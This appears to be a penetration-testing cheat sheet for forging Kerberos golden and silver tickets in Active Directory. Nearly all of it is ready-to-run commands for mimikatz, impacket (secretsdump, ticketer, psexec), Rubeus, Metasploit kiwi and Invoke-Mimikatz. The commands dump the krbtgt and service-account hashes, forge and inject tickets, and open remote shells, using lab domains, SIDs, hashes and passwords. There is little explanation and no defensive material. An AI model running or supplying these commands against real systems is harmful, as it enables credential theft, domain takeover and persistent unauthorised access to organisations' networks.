- **Forging Kerberos Tickets**

### Golden Tickets (TGT)
    //requires the Domain KRBTGT Account NTLM password hash
    //other requirements: Domain Name, SID, Impersonate user privs
    //Get hash:
        privilege::debug
        lsadump::lsa /inject /name:krbtgt
    //Pass the Ticket (generate and use):
        kerberos::golden /user:pavan /domain:ignite.local /sid:S-1-5-21-3523557010-2506964455-2614950430 /krbtgt:f3bc61e97fb14d18c42bcbf6c3a9055f /id:500 /ptt
        misc::cmd
    //Generate Saved Ticket and Use:
        kerberos::golden /user:pavan /domain:ignite.local /sid:S-1-5-21-3523557010-2506964455-2614950430 /krbtgt:f3bc61e97fb14d18c42bcbf6c3a9055f /id:500
        kerberos::ptt ticket.kirbi
        misc::cmd
    //Impacket Method:
        //get domain sid:  python lookupsid.py ignite/Administrator:Ignite@987@192.168.1.105
        //get hash:  python secretsdump.py administrator:Ignite@987@192.168.1.105 -outputfile krb -user-status
        //create & convert ticket:
            python ticketer.py -nthash f3bc61e97fb14d18c42bcbf6c3a9055f -domain-sid S-1-5-21-3523557010-2506964455-2614950430 -domain ignite.local raj
            export KRB5CCNAME=/root/Tools/impacket/examples/raj.ccache
            python ticketConverter.py /root/impacket/examples/raj.ccache ticket.kirbi
        //use it from mimikatz:
            kerberos::ptt ticket.kirbi
            misc::cmd
    //Rubeus Method:
        rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1
        rubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:harshitrajpal /printcmd
        Rubeus.exe ptt /ticket:ticket.kirbi
    //Metasploit:
        load kiwi
        //get hash:  dcsync_ntlm krbtgt
        //get info:  shell; ipconfig /all; nbtstat -a <dnsServerIP>
        //generate:  golden_ticket_create -d ignite.local -u pavan -s S-1-5-21-3523557010-2506964455-2614950430 -k f3bc61e97fb14d18c42bcbf6c3a9055f -t /root/Desktop/ticket.kirbi
    //Invoke-Mimikatz.ps1:
        //generate:  Invoke-Mimikatz -Command '"kerberos::golden /user:pavan /domain:ignite.local /sid:S-1-5-21-3523557010-2506964455-2614950430 /krbtgt:f3bc61e97fb14d18c42bcbf6c3a9055f /id:500 "'
        //use:  Invoke-Mimikatz -Command '"kerberos::purge"'; Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
        //generate and use:  Invoke-Mimikatz -Command '"kerberos::golden /user:pavan /domain:ignite.local /sid:S-1-5-21-3523557010-2506964455-2614950430 /krbtgt:f3bc61e97fb14d18c42bcbf6c3a9055f /id:500 /ptt"'
        

### Silver Tickets (TGS)
    //requires the Service Account (either the computer account or user account) password hash.
    //Linux:
        python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
        export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache 
        python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
    //Windows:
        #Create the ticket
        mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
        #Inject in memory using mimikatz or Rubeus
        mimikatz.exe "kerberos::ptt ticket.kirbi"
        .\Rubeus.exe ptt /ticket:ticket.kirbi
        #Obtain a shell
        .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
        #Example using aes key
        kerberos::golden /user:Administrator /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /target:labwws02.jurassic.park /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
        //Using Rubeus:
            rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1
            rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ignite.local\Administrator /credpassword:Ignite@987 /user:harshitrajpal /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ignite.local /ptt
